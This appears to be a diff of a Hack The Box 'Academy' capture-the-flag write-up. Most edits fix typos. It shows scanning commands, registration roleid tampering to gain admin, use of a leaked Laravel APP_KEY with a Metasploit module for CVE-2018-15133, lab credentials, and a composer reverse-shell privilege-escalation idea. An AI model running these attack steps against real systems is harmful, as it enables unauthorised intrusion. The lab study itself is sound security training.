@@ -1,6 +1,6 @@
 ![](academy_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
 </p>
 
 # Scanning
@@ -8,7 +8,7 @@
 ## Nmap
 
 `ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.215 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.215`
-```
+```bash
 PORT      STATE SERVICE VERSION
 22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
@@ -28,6 +28,7 @@ PORT      STATE SERVICE VERSION
 ## Web_server
 
 ### Gobuster
+
 `gobuster dir -u 10.10.10.215 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php -t 50`
 ```
 /academy (Status: 301)
@@ -37,13 +38,14 @@ PORT      STATE SERVICE VERSION
 ```
 /.env (Status: 200)
 ```
-* gobustering root host give so much information and the direct ssh for user in `.env` , I think this is unintended because it skips the foothold part .
+* directory brute-forcing host give so much information and the direct ssh for user in `.env` , I think this is unintended because it skips the foothold part .
 
 ## VHOST:academy.htb
 
 * in the right corner there are two options `login` `register` gobuster also identify them
 
 ### Gobuster
+
 `gobuster dir -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php -t 50`
 ```
 /admin.php (Status: 200)
@@ -53,7 +55,7 @@ PORT      STATE SERVICE VERSION
 
 ### login
 
-**_Nothing intrested in login_**
+**_Nothing interested in login_**
 
 ### register
 
@@ -67,7 +69,7 @@ PORT      STATE SERVICE VERSION
   - Role management resources provide a facility to manage roles used to determine resource access for users.
   - `roleid` set either a name or number eg. `user` or `0`
 
-* intercept register request in burp found roleid perameter
+* intercept register request in burp found roleid parameter
 
       uid=test1&password=test1&confirm=test1&roleid=0
 
@@ -78,9 +80,10 @@ PORT      STATE SERVICE VERSION
 * so i intercept a register request change roleid to `1` and create a admin account
 
 ### admin
+
 *found `admin.php` in gobuster scan*
 
-* login with registred `roleid=1` creds
+* login with registered `roleid=1` creds
 * found a VHOST and 2 users
 
       Complete initial set of modules (cry0l1t3 / mrb3n)	done
@@ -90,10 +93,11 @@ PORT      STATE SERVICE VERSION
 
 ## VHOST:dev-staging-01.academy.htb
 
-* there is a some kind of web application running on the host because it throughs a error that is not related to any http errors
+* there is some kind of application running on the host and it return a error message.
 
       UnexpectedValueException
-* reading thru it i found some intersting data
+
+* reading thru it i found some interesting data
 
       APP_NAME 	"Laravel"
       APP_KEY 	"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
@@ -118,18 +122,20 @@ PORT      STATE SERVICE VERSION
 * [Exploit PoC on github@kozmic](https://github.com/kozmic/laravel-poc-CVE-2018-15133)
 
 # User Exploit
+
 *getting user is a long road from user `www-data>>cry0l1t3>>mrb3n` to get root privesc*
+
 ## www-data shell
 
-**what is exploit :** Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.
+**what is exploit :** Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an deserialized call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in `Illuminate/Encryption/Encrypter.php` and PendingBroadcast in `gadgetchains/Laravel/RCE/3/chain.php` in `phpggc`. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.
 
-* exploit prerequirement is `APP_KEY` which i already found
+* exploit pre-requirement is `APP_KEY` which i already found
 
 ### Exploit using MSF
 
-**Exploit Module :** exploit/unix/http/laravel_token_unserialize_exec
+**Exploit Module :** `exploit/unix/http/laravel_token_unserialize_exec`
 
-```
+```bash
 msf5 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.10.10.215
 RHOSTS => 10.10.10.215
 msf5 exploit(unix/http/laravel_token_unserialize_exec) > set VHOST dev-staging-01.academy.htb
@@ -137,7 +143,7 @@ VHOST => dev-staging-01.academy.htb
 msf5 exploit(unix/http/laravel_token_unserialize_exec) > set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
 app_key => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
 ```
-```
+```bash
 [*] Command shell session 1 opened
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@academy:/var/www/html/htb-academy-dev-01/public$ whoami;id
@@ -171,6 +177,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 *thats why i thought that founding `.env` file from [gobuster]() is unintended*
 
 ### creds 
+
 `cry0l1t3:mySup3rP4s5w0rd!!`
 
 * **ssh** 
@@ -216,9 +223,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 * viewing `/etc/passwd` i find out that `UID=1002` belong to user `mrb3n`.
 
 ### creds
+
 `mrb3n:mrb3n_Ac@d3my!`
 
 ### su to mrb3n
+
 ```
 cry0l1t3@academy:~$ su - mrb3n
 Password: mrb3n_Ac@d3my!
@@ -248,7 +257,7 @@ uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
 ## attack surface
 
 * Create a `composer.json` file and inside that file specify `reverse shell` script
-    * in the script doc i found composer.json template best for [custom script ececution](https://getcomposer.org/doc/articles/scripts.md#writing-custom-commands)
+    * in the script doc i found composer.json template best for [custom script execution](https://getcomposer.org/doc/articles/scripts.md#writing-custom-commands)
 * run composer and execute the script
 
 # Root Exploit
@@ -286,4 +295,3 @@ root@academy:~# cat root.txt
 cat root.txt
 29a4ab3f************************
 ```
-
